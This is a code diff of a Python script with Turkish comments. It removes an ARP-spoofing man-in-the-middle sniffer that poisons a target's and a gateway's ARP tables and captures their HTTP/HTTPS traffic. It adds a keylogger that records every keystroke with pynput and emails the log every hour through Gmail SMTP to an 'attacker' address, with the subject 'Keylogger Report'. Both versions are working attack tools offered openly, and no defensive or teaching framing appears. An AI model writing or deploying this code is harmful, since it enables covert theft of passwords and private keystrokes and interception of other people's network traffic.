@@ -1,62 +1,54 @@
-from scapy.all import ARP, Ether, send, srp, sniff, wrpcap, Raw, TCP, IP
+import smtplib
 import time
-import sys
+from pynput.keyboard import Listener
+from threading import Timer
+import logging
 
-def get_mac(ip, interface):
-    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
-    answered_list = srp(arp_request, iface=interface, timeout=2, verbose=False)[0]
+# E-posta ayarları
+sender_email = "hedefmail@gmail.com"
+receiver_email = "saldirganmail@gmail.com"
+email_password = "your_password_here"  # Şifreyi girmeniz gerekecek
+smtp_server = "smtp.gmail.com"
+smtp_port = 587
+
+# Logging ayarları
+log_file = "keystrokes.txt"
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+# Kaydedilen tuşları göndermek için fonksiyon
+def send_email():
+    with open(log_file, "r") as file:
+        content = file.read()
     
-    if answered_list:
-        return answered_list[0][1].hwsrc
-    else:
-        print(f"[!] {ip} için ARP isteğine yanıt alınamadı.")
-        sys.exit(1)
-
-def spoof(target_ip, spoof_ip, interface):
-    target_mac = get_mac(target_ip, interface)
-    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(arp_response, iface=interface, verbose=False)
-
-def restore(target_ip, gateway_ip, interface):
-    target_mac = get_mac(target_ip, interface)
-    gateway_mac = get_mac(gateway_ip, interface)
-    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
-    send(arp_response, iface=interface, verbose=False)
-    print("[+] ARP Tabloları Düzeltildi")
-
-def packet_callback(packet):
-    if packet.haslayer(TCP):
-        if packet.haslayer(Raw):
-            payload = packet[Raw].load.decode(errors="ignore")
-            if "HTTP" in payload:
-                print(f"\n[HTTP Paketi] {packet[IP].src} -> {packet[IP].dst}")
-                print(payload)
-        elif packet[TCP].dport == 443 or packet[TCP].sport == 443:
-            print(f"[HTTPS Paketi] {packet[IP].src} -> {packet[IP].dst}")
-
-def sniff_packets(interface, packet_count):
-    print(f"[*] HTTP ve HTTPS trafiği dinleniyor... ({packet_count} paket yakalanacak)")
-    packets = sniff(iface=interface, count=packet_count, prn=packet_callback, filter="tcp")
-    wrpcap("captured_traffic.pcap", packets)
-    print("[+] Paketler 'captured_traffic.pcap' dosyasına kaydedildi.")
-
-def main():
-    target_ip = input("[?] Hedef IP adresini girin: ")
-    gateway_ip = input("[?] Ağ geçidi (gateway) IP adresini girin: ")
-    interface = input("[?] Ağ arayüzünü girin (örneğin, eth0 veya wlan0): ")
-    packet_count = int(input("[?] Kaç paket yakalamak istiyorsunuz: "))
-
     try:
-        print("[*] MITM Saldırısı Başlıyor... (CTRL+C ile durdurabilirsiniz)")
-        while True:
-            spoof(target_ip, gateway_ip, interface)
-            spoof(gateway_ip, target_ip, interface)
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print("\n[-] Saldırı Durduruluyor...")
-        restore(target_ip, gateway_ip, interface)
-        sniff_packets(interface, packet_count)
-        sys.exit(0)
+        with smtplib.SMTP(smtp_server, smtp_port) as server:
+            server.starttls()
+            server.login(sender_email, email_password)
+            message = f"Subject: Keylogger Report\n\n{content}"
+            server.sendmail(sender_email, receiver_email, message)
+            print("E-posta gönderildi!")
+    except Exception as e:
+        print(f"E-posta gönderme hatası: {e}")
+    
+    # Tuşları kaydetmeye devam etmek için tekrar çağırıyoruz
+    Timer(3600, send_email).start()  # Her 1 saatte bir gönderir
 
+# Tuş basımlarını kaydetmek için fonksiyon
+def on_press(key):
+    try:
+        logging.info(f'{key.char}')
+    except AttributeError:
+        logging.info(f'{key}')
+
+# Başlatma fonksiyonu
+def start_keylogger():
+    # E-posta göndermeyi başlat
+    send_email()
+
+    # Klavye dinleyicisini başlat
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+# Ana fonksiyon
 if __name__ == "__main__":
-    main()
+    start_keylogger()
